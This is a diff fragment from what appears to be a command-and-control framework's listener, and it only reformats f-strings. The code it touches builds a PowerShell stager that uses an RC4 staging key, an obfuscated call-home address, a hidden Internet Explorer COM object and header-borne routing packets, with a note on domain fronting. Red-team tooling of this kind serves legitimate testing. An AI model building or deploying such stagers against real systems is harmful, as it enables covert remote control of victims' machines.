@@ -241,7 +241,7 @@ class Listener:
                     host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
@@ -258,12 +258,10 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket)
 
             stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-            stager += (
-                f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
-            )
+            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
 
             # add the RC4 packet to a header location
-            stager += f'$c="{ requestHeader }: { b64RoutingPacket }'
+            stager += f'$c="{requestHeader}: {b64RoutingPacket}'
 
             # Add custom headers if any
             modifyHost = False
@@ -275,7 +273,7 @@ class Listener:
                     if headerKey.lower() == "host":
                         modifyHost = True
 
-                    stager += f"`r`n{ headerKey }: { headerValue }"
+                    stager += f"`r`n{headerKey}: {headerValue}"
 
             stager += '";'
             # If host header defined, assume domain fronting is in use and add a call to the base URL first
